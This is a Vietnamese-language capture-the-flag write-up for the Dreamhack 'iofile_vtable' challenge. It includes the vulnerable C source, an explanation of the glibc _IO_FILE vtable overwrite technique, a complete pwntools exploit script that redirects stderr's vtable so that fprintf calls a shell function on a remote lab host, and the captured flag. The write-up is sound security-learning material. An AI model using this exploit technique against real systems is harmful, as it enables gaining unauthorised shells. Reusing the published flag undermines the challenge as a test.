# iofile_vtable

trước khi làm chall này ta cần tìm hiểu về **kĩ thuật _IO_FILE vtable overwrite**

## reference

dreamhack: https://learn.dreamhack.io/11#40

writeup: https://lactea.kr/entry/pwnable-IOFILE-structure-and-vtable-overwrite

## source C

```c 
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char name[8];
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}
int main(int argc, char *argv[]) {
    int idx = 0;
    int sel;

    initialize();

    printf("what is your name: ");
    read(0, name, 8);
    while(1) {
        printf("1. print\n");
        printf("2. error\n");
        printf("3. read\n");
        printf("4. chance\n");
        printf("> ");

        scanf("%d", &sel);
        switch(sel) {
            case 1:
                printf("GOOD\n");
                break;
            case 2:
                fprintf(stderr, "ERROR\n");
                break;
            case 3:
                fgetc(stdin);
                break;
            case 4:
                printf("change: ");
                read(0, stderr + 1, 8);
                break;
            default:
                break;
            }
    }
    return 0;
}

```

đọc qua source C thì **ta thấy có hàm fprintf(), nên có thể ta dùng được kĩ thuật _IO_FILE vtable overwrite**

## Phân tích
- mới vào ta phải nhập giá trị cho name là 8byte, hmm khả năng cao ta sẽ nhập 1 địa chỉ vào đây
- chương trình cho ta 4 option 
- option 1 và 3 thì không hỗ trợ gì cho việc khai thác nên mình cũng ko đào sâu vào, nhưng mà tại option 2 và 4 thì quan trọng đấy, ta cần phân tích chỗ này

![image](https://github.com/gookoosss/CTF/assets/128712571/954fb9d4-9931-48d6-8695-2ad30d1aa740)


- như trong ảnh trên thì **stderr là _IO_2_1_stderr_**
- **stderr + 1 là địa chỉ chứa giá trị của vtable = 0x7ffff7fa4600**
- lúc này ta hình dung ra hướng làm là : tại option 4 cho phép ta thay đổi giá trị của vtable , ta sẽ gửi địa chỉ ta muốn vào để lấy shell, còn option 2 sẽ thực thi shell code

## Khai thác

- trước tiên ta cần lưu địa chỉ của shell_code vào biến name trong lần nhập đầu

```python 
name = 0x000000006010d0

payload = p64(exe.sym['get_shell'])

p.sendafter(b'name: ',payload)
```

- lúc này địa chỉ của name đã lưu đỉa chỉ của get_shell nên ta có thể sử dụng name để gán cho vtable tại option 4
- trước khi làm việc đó thì ta cần phân tích hàm fprintf xem sao

![image](https://github.com/gookoosss/CTF/assets/128712571/6e2cc6a7-b0f2-4f61-b21c-023abf865e86)


![image](https://github.com/gookoosss/CTF/assets/128712571/11fde6e1-2240-4ea5-bfed-02bb68672758)


- theo như nhiều nguồn tham khảo thì ta cần tính thêm offset của __xsputn với _IO_file_jump, rồi lấy địa name trù đi offset ta vừa tính được

![image](https://github.com/gookoosss/CTF/assets/128712571/829d872d-c51d-4886-aa3e-ef1c750d82a7)


- như ta đã thấy thì __xsputn được lưu trong địa chỉ 0x7ffff7fa4638 , giờ ta sẽ tính offset đến _IO_file_jumps

![image](https://github.com/gookoosss/CTF/assets/128712571/a36faa99-4bf0-417b-be66-8fa7a735def4)


- có đầy đủ thứ ta cần r , viết script và lấy shell thôi

![image](https://github.com/gookoosss/CTF/assets/128712571/4a27b51d-c89f-42bb-9e68-4494be9c67a4)


## script 

```python 
from pwn import *


p = remote('host3.dreamhack.games', 18846)
exe = ELF('./iofile_vtable')

# p = process('./iofile_vtable')

# gdb.attach(p, gdbscript = '''
# b*main+77
# b*main+293
# b*main+228
# c
# ''')

# input()

name = 0x000000006010d0

payload = p64(exe.sym['get_shell'])

p.sendafter(b'name: ',payload)

p.sendlineafter(b'> ', b'4')

payload = p64(name - 0x38)

p.sendafter(b'change: ',payload)

p.sendlineafter(b'> ', b'2')

p.interactive()

# DH{9f746608b2c9239b6b80eb5bbcae06ed}
```

## Flag 

DH{9f746608b2c9239b6b80eb5bbcae06ed}
